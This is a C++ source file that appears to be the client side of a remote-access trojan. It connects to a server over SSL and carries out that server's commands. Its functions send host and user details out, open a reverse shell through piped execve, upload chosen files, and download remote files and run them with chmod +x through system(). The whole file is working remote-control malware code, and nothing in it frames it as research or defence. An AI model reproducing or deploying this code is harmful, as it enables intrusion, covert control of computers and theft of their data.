#include "Client.hpp"
#include "Commands.hpp"
#include "Misc.hpp"
#include "Info.hpp"

bool Client::CheckSslReturnCode(int iRet){
	int iTmp = SSL_get_error(sslSocket, iRet);
	switch(iTmp){
		case SSL_ERROR_NONE:
			//just try again
			return true;
		case SSL_ERROR_ZERO_RETURN:
			//peer disconencted
			#ifdef _DEBUG
			std::cout<<"Peer disconnected\n";
			#endif
			return false;
		case SSL_ERROR_WANT_READ:
			//no data available to read
			return true;
		case SSL_ERROR_WANT_WRITE:
			//unable to write
			return true;
		default:
			#ifdef _DEBUG
			std::cout<<"error "<<iTmp<<'\n';
			ERR_print_errors_fp(stderr);
			#endif
			return true;
	}
	return true;
}

bool Client::SendInfo(){
        #ifdef _DEBUG
        std::cout<<"Sending info\n";
        #endif
        bool bFlag = true;
        std::string strFinal = "";
        std::vector<struct sPartition> vcVec;
        std::vector<struct sUsers> vcVec2;
        char *cUname = nullptr, *cCpu = nullptr, *cCores = nullptr, *cUsername = nullptr;
        Uname(cUname);
        Cpu(cCpu, cCores);
        if(UserName(cUsername) == 0){
                strFinal.append(cUsername);
        } else {
                strFinal.append("siseneg");
        }       
        strFinal.append(1, '|');
        Partitions(vcVec);
        Users(vcVec2);
        for(int iIt = 0; iIt<int(vcVec.size()); iIt++){
                strFinal.append(vcVec[iIt].cPartition);
                strFinal.append(1, ':');
                strFinal.append(std::to_string(vcVec[iIt].dParitionSize));
                strFinal.append(1, '*');
        }
                strFinal.append(1, '|');
        for(int iIt2 = 0; iIt2<int(vcVec2.size()); iIt2++){
                //std::cout<<vcVec2[iIt2].cUsername<<'\t'<<vcVec2[iIt2].cShell<<'\n';
                strFinal.append(vcVec2[iIt2].cUsername);
                strFinal.append(1, ':');
                strFinal.append(vcVec2[iIt2].cShell);
                strFinal.append(1, '*');
        }
        strFinal.append(1, '|');
        strFinal.append(cCpu);
        strFinal.append(1, '|');
        strFinal.append(cCores);
        strFinal.append(1, '|');
        strFinal.append(cUname);
        strFinal.append(1, '|');
        strFinal.append(std::to_string(Mem()));
        strFinal.append("|AAA");
        #ifdef _DEBUG
        std::cout<<"packet\n"<<strFinal<<'\n';
        #endif
        int iLen = strFinal.length(), iBytes = 0;
        TryAgain:
        iBytes = SSL_write(sslSocket, strFinal.c_str(), iLen);
        if(iBytes <= 0){
	        if(!CheckSslReturnCode(iBytes)){
				#ifdef _DEBUG
	                std::cout<<"Unable to send data to server\n";
	                error();
	                #endif
	                bFlag = false;
			} else {
				usleep(100000);
				goto TryAgain;
			}
		}
        delete[] cUsername;
        cUsername = nullptr;
        delete[] cUname;
	    cUname = nullptr;
        delete[] cCpu;
        cCpu = nullptr;
        delete[] cCores;
        cCores = nullptr;
        return bFlag;
}

void Client::threadReadShell(int& Pipe){
	fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
	char cCmdOutput[256];
	int iRet = 0, iLen = 0;
	while(isRunningShell){
		while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){ //sleep until reads data or loop break
			if(!isRunningShell){
				break;
			}
			usleep(100000);
			continue;
		}
		cCmdOutput[iRet] = '\0';
		iLen = strlen(cCmdOutput);
		iRet = SSL_write(sslSocket, cCmdOutput, iLen);
		if(!CheckSslReturnCode(iRet)){
			mtxMutex.lock();
			isRunningShell = false;
			mtxMutex.unlock();
			break;
		} else {
			usleep(100000); //wait 100 miliseconds
		}
		#ifdef _DEBUG
		std::cout<<"\nSent "<<iRet<<" bytes\n";
		#endif
	}
}

void Client::SpawnShell(const std::string strCommand){
	if(!Misc::FileExists(strCommand.c_str())){
		#ifdef _DEBUG
		std::cout<<"File "<<strCommand<<" doesnt exist\n";
		#endif
		TryAgain0:
		int itRet = SSL_write(sslSocket, CommandCodes::cShellError, 3);
		if(itRet <= 0){
			if(!CheckSslReturnCode(itRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send command to server\n";
				error();
				#endif
			} else {
				usleep(100000);
				goto TryAgain0;
			}
		}
		return;
	}
	#ifdef _DEBUG
	std::cout<<"Spawn "<<strCommand<<'\n';
	#endif
	int InPipeFD[2], OutPipeFD[2], iRet = 0;
	if(pipe(InPipeFD) == -1){
		#ifdef _DEBUG
		std::cout<<"pipe error\n";
		error();
		#endif
		TryAgain:
		iRet = SSL_write(sslSocket, CommandCodes::cShellError, 3);
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send command to server\n";
				error();
				#endif
			} else {
				usleep(100000);
				goto TryAgain;
			}
		}
		return;
	}
	if(pipe(OutPipeFD) == -1){
		#ifdef _DEBUG
		std::cout<<"pipe error\n";
		error();
		#endif
		close(InPipeFD[0]);
		close(InPipeFD[1]);
		TryAgain2:
		iRet = SSL_write(sslSocket, CommandCodes::cShellError, 3); 
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send command to server\n";
				error();
				#endif
			 } else {
				usleep(100000);
				goto TryAgain2;
			}
		}
		return;
	}
	pid_t pP = vfork();
	if(pP == 0){
		TryAgain3:
		iRet = SSL_write(sslSocket, CommandCodes::cShellRunning, 3);
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send command to server\n";
				error();
				#endif
				exit(0);
			} else {
				usleep(100000);
				goto TryAgain3;
			}
		}
		#ifdef _DEBUG
		std::cout<<"Shell running\n";
		#endif
		dup2(InPipeFD[0], 0);
		dup2(OutPipeFD[1], 1);
		dup2(OutPipeFD[1], 2);
		close(InPipeFD[0]);
		close(InPipeFD[1]);
		close(OutPipeFD[0]);
		close(OutPipeFD[1]);
		char *argv[] = {nullptr};
		char *env[] = {nullptr};
		execve(strCommand.c_str(), argv, env);
		exit(0);
	} else if(pP > 0) {
		close(InPipeFD[0]);
		close(OutPipeFD[1]);
		isRunningShell = true;
		
		std::thread t1(&Client::threadReadShell, this, std::ref(OutPipeFD[0]));
		
		char cCmdBuffer[512];
		int iBytes = 0, iLen = 0;
		while(isRunningShell){
			iBytes = SSL_read(sslSocket, cCmdBuffer, 511);
			if(!CheckSslReturnCode(iBytes)){
				mtxMutex.lock();
				isRunningShell = false;
				mtxMutex.unlock();
				#ifdef _DEBUG
				std::cout<<"Unable to receive command from server\n";
				error();
				#endif
				break;
			} else {
				if(iBytes < 0){
					usleep(2);
					continue;
				}
			}
			cCmdBuffer[iBytes] = '\0';
			#ifdef _DEBUG
			std::cout<<"command "<<cCmdBuffer<<'\n';
			#endif
			iLen = strlen(cCmdBuffer);
			write(InPipeFD[1], cCmdBuffer, iLen);
			if(strcmp(cCmdBuffer, "exit\n") == 0){
				#ifdef _DEBUG
				std::cout<<"\nbye\n";
				#endif
				isRunningShell = false;
				break;
			}
		}
		t1.join();
		
		TryAgain4:
		iRet = SSL_write(sslSocket, CommandCodes::cShellEnd, 3);
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send command to server\n";
				error();
				#endif
			} else {
				usleep(100000);
				goto TryAgain4;
			}
		}	
	} else {
		#ifdef _DEBUG
		std::cout<<"fork failed\n";
		error();
		#endif
		TryAgain5:
		iRet = SSL_write(sslSocket, CommandCodes::cShellError, 3); 
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send command to server\n";
				error();
				#endif
			} else {
				usleep(100000);
				goto TryAgain5;
			}
		}
	}
}

bool Client::SendFile(const std::string strLocalFile) {
	#ifdef _DEBUG
	std::cout<<"Sending "<<strLocalFile<<'\n';
	#endif
	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
	if(!strmInputFile.is_open()){
		#ifdef _DEBUG
		std::cout<<"Unable to open file\n";
		error();
		#endif
		TryAgain:
		int iTmp = SSL_write(sslSocket, CommandCodes::cFileError, 3);
		if(iTmp <= 0){
			if(!CheckSslReturnCode(iTmp)){
				#ifdef _DEBUG
				std::cout<<"Unable to send packet\n";
				#endif
			} else {
				usleep(100000);
				goto TryAgain;
			}
		}
		return false;
	}
	u_int iBlockSize = 255;
	int iLen = 0, iRet = 0;
	u64 uFileSize = Misc::GetFileSize(strLocalFile);
	u64 uBytesSent = 0;
	if(uFileSize == 0){
		#ifdef _DEBUG
		std::cout<<"File size is 0\n";
		#endif
		TryAgain1:
		iRet = SSL_write(sslSocket, CommandCodes::cFileError, 3);
		if(iRet <= 0){
			if(!CheckSslReturnCode(iRet)){
				#ifdef _DEBUG
				std::cout<<"Unable to send packet\n";
				#endif
			} else {
				usleep(100000);
				goto TryAgain1;
			}
		}
		strmInputFile.close();
		return false;
	}
	std::string strCmdLine = CommandCodes::cFileSize;
	strCmdLine.append(std::to_string(uFileSize));
	#ifdef _DEBUG
	std::cout<<"File size is "<<uFileSize<<'\n';
	#endif
	iLen = strCmdLine.length();
	TryAgain2:
	iRet = SSL_write(sslSocket, strCmdLine.c_str(), iLen); 
	if(iRet > 0){
		sleep(1);
		char *cFileBuffer = nullptr;
		int iTmp = 0;
		cFileBuffer = new char[iBlockSize];
		while(1){
			strmInputFile.read(cFileBuffer, iBlockSize);
			iTmp = strmInputFile.gcount();
			if(iTmp > 0){
				FileSendTryAgain:
				int iBytes = SSL_write(sslSocket, cFileBuffer, iTmp);
				if(iBytes> 0){
					uBytesSent += iBytes;
					#ifdef _DEBUG
					Misc::ProgressBar(uBytesSent, uFileSize);
					std::fflush(stdout);
					#endif
				} else {
					if(!CheckSslReturnCode(iBytes)){
						break;
					}
					usleep(2);
					goto FileSendTryAgain;
				}
			} else {		
				break;
			}
		}
		#ifdef _DEBUG
		std::cout<<"\nTransfer done\n";
		#endif
		Misc::Free(cFileBuffer, iBlockSize);	
	} else {
		if(!CheckSslReturnCode(iRet)){
			#ifdef _DEBUG
			std::cout<<"Unable to send command to server\n";
			error();
			#endif
			strmInputFile.close();
			return false;
		} else {
			usleep(100000);
			goto TryAgain2;
		}
	}
	strmInputFile.close();
	return true;
}

void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocalFileName){
	#ifdef _DEBUG
	std::cout<<"Saving file "<<strLocalFileName<<"\nSize "<<uFileSize<<"\n Execute "<<cExec<<'\n';
	#endif
	int iRet = 0;
	std::ofstream strmOutputFile(strLocalFileName, std::ios::binary);
	if(!strmOutputFile.is_open()){
		#ifdef _DEBUG
		std::cout<<"Unable to open file "<<strLocalFileName<<" trying /tmp/dummy_file.bin\n";
		error();
		#endif
		strmOutputFile.open("/tmp/dummy_file.bin", std::ios::binary);
		if(!strmOutputFile.is_open()){
			#ifdef _DEBUG
			std::cout<<"Unable to open dummy file?\n";
			error();
			#endif
			TryAgain:
			iRet = SSL_write(sslSocket, CommandCodes::cFileTransferCancel, 3); 
			if(iRet <= 0){
				if(!CheckSslReturnCode(iRet)){
					#ifdef _DEBUG
					std::cout<<"Unable to send cancel command\n";
					error();
					#endif
				} else {
					usleep(100000);
					goto TryAgain;
				}
			}
			return;
		}
	}
	TryAgain2:
	iRet = SSL_write(sslSocket, CommandCodes::cFileTranferBegin, 3); 
	if(iRet <= 0){
		if(!CheckSslReturnCode(iRet)){
			#ifdef _DEBUG
			std::cout<<"Unable to send confirmation to server\n";
			error();
			#endif
			strmOutputFile.close();
			return;
		} else {
			usleep(100000);
			goto TryAgain2;
		}
	}
	u64 uTotalBytes = 0;
	int iBufferSize = 255, iBytesRead = 0;
	char *cFileBuffer = new char[iBufferSize];
	while(uTotalBytes<uFileSize){
		iBytesRead = SSL_read(sslSocket, cFileBuffer, iBufferSize);
		if(iBytesRead > 0){
			strmOutputFile.write(cFileBuffer, iBytesRead);
			uTotalBytes += iBytesRead;
			#ifdef _DEBUG
			Misc::ProgressBar(uTotalBytes, uFileSize);
			std::fflush(stdout);
			#endif
		} else {
			if(!CheckSslReturnCode(iBytesRead)){
				#ifdef _DEBUG
				std::cout<<"Unable to read packet from server\n";
				error();
				#endif
				break;
			}
			usleep(100000);
		}
	}
	#ifdef _DEBUG
	std::cout<<"\nTransfer done "<<uTotalBytes<<" bytes\n";
	#endif
	strmOutputFile.close();
	Misc::Free(cFileBuffer, iBufferSize);
}

bool Client::ParseCommand(char*& strCommand){
	#ifdef _DEBUG
	std::cout<<"Parsing command "<<strCommand<<'\n';
	#endif
	std::string strLocalFileName = "", strCmdLine = "";
	std::vector<std::string> vcCommands;
	Misc::strSplit(strCommand, '@', vcCommands, 10);
	if(vcCommands.size() > 0){
		if(vcCommands[0] == CommandCodes::cUpload){
			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[2][0], vcCommands[3]);
			goto release;
		}
		if(vcCommands[0] == "s"){
			if(vcCommands[1] == "0"){
				#ifdef _DEBUG
				std::cout<<"Bye\n";
				#endif
				return false;    //return false to close connection
			}
			goto release;
		}
		if(vcCommands[0] == CommandCodes::cDownload){
			if(SendFile(vcCommands[1])){
				#ifdef _DEBUG
				std::cout<<"Send success\n";
				#endif
			}
			goto release;
		}
		if(vcCommands[0] == CommandCodes::cShell){
			SpawnShell(vcCommands[1]);
			goto release;
		}
		if(vcCommands[0] == CommandCodes::cHttpd){
			if(Download(vcCommands[1].c_str(), strLocalFileName)){
				#ifdef _DEBUG
				std::cout<<"\nDownload success\n";
				#endif
				if(vcCommands[2] == "1"){
					#ifdef _DEBUG
					std::cout<<"Executing file "<<strLocalFileName<<'\n';
					#endif
					strCmdLine = "chmod +x ";
					strCmdLine.append(strLocalFileName);
					strCmdLine.append(" && ");
					strCmdLine.append(strLocalFileName);
					strCmdLine.append(" &");
					system(strCmdLine.c_str());
				}
			} else {
				#ifdef _DEBUG
				std::cout<<"\nUnable to download file\n";
				#endif
			}
			goto release;
		}
		if(vcCommands[0] == "i"){
			if(vcCommands[1] == "0"){
				if(!SendInfo()){
					#ifdef _DEBUG
					std::cout<<"Unable to send information\n";
					error();
					#endif
				}
			}
		}
		
	} else {
		#ifdef _DEBUG
		std::cout<<"Error parsing command, raw data:\n----------\n"<<strCommand<<"\n---------n";
		#endif
	}
	release:
	return true;
}

bool Client::Connect(c_char* cIP, c_char* cPORT){
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	if(sslCTX){
		SSL_CTX_free(sslCTX);
		sslCTX = nullptr;
	}
	if(sslSocket){
		SSL_free(sslSocket);
		sslSocket = nullptr;
	}
	sslCTX = SSL_CTX_new(SSLv23_client_method());
	if(sslCTX == nullptr){
		#ifdef _DEBUG
		std::cout<<"SSL_CTX_new error\n";
		error();
		#endif
		return false;
	}
	int iRet;
	if((iRet = getaddrinfo(cIP, cPORT, &strctAd, &strctServer)) != 0){
		#ifdef _DEBUG
		std::cout<<"getaddrinfo: "<<gai_strerror(iRet)<<'\n';
		#endif
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			#ifdef _DEBUG
			std::cout<<"error socket\n";
			error();
			#endif
			continue;
		}
		if(connect(sckSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			#ifdef _DEBUG
			std::cout<<"error connecting\n";
			error();
			#endif
			close(sckSocket);
			continue;
		}
		break;
	}
	if(strctP == nullptr){
		#ifdef _DEBUG
		std::cout<<"unable to connect\n";
		#endif
		freeaddrinfo(strctServer);
		return false;
	}
	sslSocket = SSL_new(sslCTX);
	SSL_set_fd(sslSocket, sckSocket);
	if(SSL_connect(sslSocket) == -1){
		freeaddrinfo(strctServer);
		#ifdef _DEBUG
		std::cout<<"Unable to stablish SSL connection\n";
		error();
		#endif
		return false;
	}
	freeaddrinfo(strctServer);
	fcntl(sckSocket, F_SETFL, O_NONBLOCK);
	return true;
}

void Client::CloseConnection(){
	close(sckSocket);
	if(sslSocket){
		SSL_free(sslSocket);
		sslSocket = nullptr;
	}
}
